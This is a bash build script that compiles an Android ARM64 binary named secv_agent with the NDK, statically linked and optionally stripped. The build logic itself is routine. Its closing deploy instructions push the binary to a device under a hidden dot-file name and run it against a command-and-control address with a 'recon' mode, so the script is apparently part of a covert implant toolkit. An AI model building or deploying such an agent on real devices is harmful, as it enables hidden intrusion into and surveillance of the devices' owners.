#!/usr/bin/env bash
# Build secv_agent.c for Android ARM64 (arm64-v8a)
# Requires Android NDK r25+ installed.
#
# Usage:
#   ./build.sh                        # auto-detect NDK
#   NDK=/opt/android-ndk ./build.sh   # explicit NDK path
#   ./build.sh --api 34               # target API level (default: 34)
#   ./build.sh --strip                # strip debug symbols

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SRC="$SCRIPT_DIR/secv_agent.c"
OUT="$SCRIPT_DIR/secv_agent"
API="${API:-34}"
STRIP=0

# ── Parse args ────────────────────────────────────────────────────────────────
while [[ $# -gt 0 ]]; do
  case "$1" in
    --api)   API="$2"; shift 2 ;;
    --strip) STRIP=1; shift ;;
    *)       echo "Unknown arg: $1"; exit 1 ;;
  esac
done

# ── Locate NDK ────────────────────────────────────────────────────────────────
find_ndk() {
  # Explicit env
  [[ -n "${NDK:-}" && -d "$NDK" ]] && { echo "$NDK"; return; }
  # Common locations
  local candidates=(
    "$HOME/Android/Sdk/ndk"
    "/opt/android-ndk"
    "/usr/lib/android-ndk"
    "/opt/android-sdk/ndk"
    "$HOME/.local/lib/android-ndk"
  )
  for c in "${candidates[@]}"; do
    if [[ -d "$c" ]]; then
      # Pick highest version
      local ndk_path
      ndk_path=$(find "$c" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | sort -V | tail -1)
      [[ -n "$ndk_path" ]] && { echo "$ndk_path"; return; }
      echo "$c"; return
    fi
  done
  # SDK manager style: ~/Android/Sdk/ndk/<version>
  for sdk in "$HOME/Android/Sdk" "$HOME/android-sdk"; do
    local ndk_base="$sdk/ndk"
    if [[ -d "$ndk_base" ]]; then
      local ndk_path
      ndk_path=$(find "$ndk_base" -maxdepth 1 -mindepth 1 -type d 2>/dev/null | sort -V | tail -1)
      [[ -n "$ndk_path" ]] && { echo "$ndk_path"; return; }
    fi
  done
  echo ""
}

NDK_ROOT="$(find_ndk)"
if [[ -z "$NDK_ROOT" ]]; then
  echo "[!] Android NDK not found. Set NDK=/path/to/ndk or install via:"
  echo "    sdkmanager 'ndk;26.3.11579264'"
  exit 1
fi

TOOLCHAIN="$NDK_ROOT/toolchains/llvm/prebuilt/linux-x86_64/bin"
if [[ ! -d "$TOOLCHAIN" ]]; then
  # macOS host
  TOOLCHAIN="$NDK_ROOT/toolchains/llvm/prebuilt/darwin-x86_64/bin"
fi
if [[ ! -d "$TOOLCHAIN" ]]; then
  echo "[!] Toolchain not found under $NDK_ROOT"
  exit 1
fi

CC="$TOOLCHAIN/aarch64-linux-android${API}-clang"
if [[ ! -f "$CC" ]]; then
  echo "[!] Compiler not found: $CC"
  echo "    Available API levels:"
  ls "$TOOLCHAIN"/aarch64-linux-android*-clang 2>/dev/null | grep -oP 'android\K\d+' | sort -n
  exit 1
fi

STRIP_BIN="$TOOLCHAIN/llvm-strip"

# ── Build ──────────────────────────────────────────────────────────────────────
echo "[*] NDK: $NDK_ROOT"
echo "[*] CC:  $CC"
echo "[*] Target API: $API  →  $OUT"

"$CC" \
  -O2 \
  -static \
  -fstack-protector-strong \
  -D__ANDROID_API__="$API" \
  -o "$OUT" \
  "$SRC"

echo "[+] Build OK: $OUT ($(du -h "$OUT" | cut -f1))"

if [[ $STRIP -eq 1 && -f "$STRIP_BIN" ]]; then
  "$STRIP_BIN" "$OUT"
  echo "[+] Stripped: $OUT ($(du -h "$OUT" | cut -f1))"
fi

# Verify ELF
if command -v file &>/dev/null; then
  file "$OUT"
fi

echo ""
echo "Deploy:"
echo "  adb push $OUT /data/local/tmp/._secv_agent"
echo "  adb shell chmod 755 /data/local/tmp/._secv_agent"
echo "  adb shell /data/local/tmp/._secv_agent <C2_IP> 8889 recon"
